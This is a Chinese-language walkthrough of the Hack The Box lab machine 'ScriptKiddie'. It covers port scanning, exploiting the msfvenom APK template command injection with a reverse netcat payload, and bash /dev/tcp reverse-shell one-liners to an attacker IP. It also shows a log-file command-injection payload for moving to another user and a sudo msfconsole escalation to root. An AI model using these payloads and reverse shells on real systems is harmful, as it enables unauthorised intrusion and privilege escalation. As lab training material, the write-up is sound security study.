# 服务探测

开放端口
```
┌──(root㉿rock)-[~/htb/ScriptKiddie]
└─# nmap -p- --open 10.10.10.226               
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 02:13 EDT
Nmap scan report for 10.10.10.226
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 5.58 seconds

```

详细端口信息
```
┌──(root㉿rock)-[~/htb/ScriptKiddie]
└─# nmap -sV -Pn -A -O 10.10.10.226 -p 22,5000
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 02:17 EDT
Nmap scan report for 10.10.10.226
Host is up (0.0085s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   7.21 ms 10.10.16.1
2   2.95 ms 10.10.10.226

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.50 seconds

```


# web

5000端口是一个执行各种命令的页面，尝试各种命令注入无果

我们留意到期中一个命令执行是生成一个msfvenom的payload，其中需要上传一个文件

linux上传.elf文件
windows上传.exe文件
安卓上传.apk文件


感觉入口应该是在这里

kali搜索msfvenom相关的漏洞

```
┌──(root💀kali)-[~/htb/ScriptKiddie]
└─# searchsploit msfvenom                                                                                     130 ⨯
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection             | multiple/local/49491.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

找到一个python版本的exp，但是我本地因为py的各种依赖问题不能成功执行，根据漏洞编号去到msf寻找这个漏洞的exp
```
msf6 exploit(multi/http/werkzeug_debug_rce) > search 2020-7384

Matching Modules
================

   #  Name                                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                                    ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection 
```

载入，生成一个apk文件
```
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  207.246.124.194  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.16.2
lhost => 10.10.16.2
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /root/.msf4/local/msf.apk

```

通过首页上传到服务器，当服务器程序执行msfvenom时，本地收到一个rev shell


```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Command shell session 1 opened (10.10.16.2:4444 -> 10.10.10.226:51136) at 2022-06-24 06:02:05 -0400

id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
whoami
kid

```

拿到user.txt
```
ls
html
logs
snap
user.txt
cat user.txt
bb9561c6fe02ab1...
```

# 横向提权到pwn
切换成tty
```
python3 -c "__import__('pty').spawn('/bin/bash')"
```

反弹一个shell操作
```
bash -i >& /dev/tcp/10.10.16.2/4242 0>&1
```

发现一个bash脚本
```
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

```

留意有一个hackers日志文件

研究与这个日志相关的py代码我们留意这个函数
```
def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")
```

当检测到非法输入时，把时间和ip写入```/home/kid/logs/hackers```

```
f.write(f'[{datetime.datetime.now()}] {srcip}\n')
```

本地起一个py脚本，打印上面的输出，我们知道日志的格式是
```
[2022-06-28 17:34:11.250129] 127.0.0.1
```

查看hackers文件权限，尝试写入但是无法回显，原因是写入的内容被极快的清空了
```
kid@scriptkiddie:~/logs$ ll
ll
total 8
drwxrwxrwx  2 kid kid 4096 Feb  3  2021 ./
drwxr-xr-x 11 kid kid 4096 Feb  3  2021 ../
-rw-rw-r--  1 kid pwn    0 Jul  1 06:54 hackers
```

证明：
```
kid@scriptkiddie:~/html$ echo "[2021-05-28 12:37:32.655374] 127.0.0.1" > hackers; cat hackers; echo sleep; sleep 1; cat hackers; echo done
<ackers; echo sleep; sleep 1; cat hackers; echo done
[2021-05-28 12:37:32.655374] 127.0.0.1
sleep
[2021-05-28 12:37:32.655374] 127.0.0.1
done
kid@scriptkiddie:~/html$ 

```

scanlosers.sh里的这句其实是把IP从日志抽取出来
```
cat $log | cut -d' ' -f3- | sort -u
```

然后执行nmap命令
```
sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
```

```${ip}```是我们可以控制的输入，因此存在命令注入

使用下面payload
```
echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.16.2/4242 0>&1' # ."  > /home/kid/logs/hackers
```

成功横移到pwn用户
```
┌──(root💀kali)-[~/htb/ScriptKiddie]
└─# nc -lnvp 4242                                                                                                 1 ⨯
listening on [any] 4242 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.226] 52008
bash: cannot set terminal process group (875): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ whoami
whoami
pwn
pwn@scriptkiddie:~$ id
id
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
pwn@scriptkiddie:~$ 

```

# 提权到root

直接进入msf
```
sudo /opt/metasploit-framework-6.0.9/msfconsole
```

在msf是可以直接执行命令的，读取root.txt
```
msf6 > cat root.txt
stty: 'standard input': Inappropriate ioctl for device
[*] exec: cat root.txt

ed5898b933e2c05d61d5792aa1bb416a
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
msf6 > whoami
stty: 'standard input': Inappropriate ioctl for device
[*] exec: whoami

root

```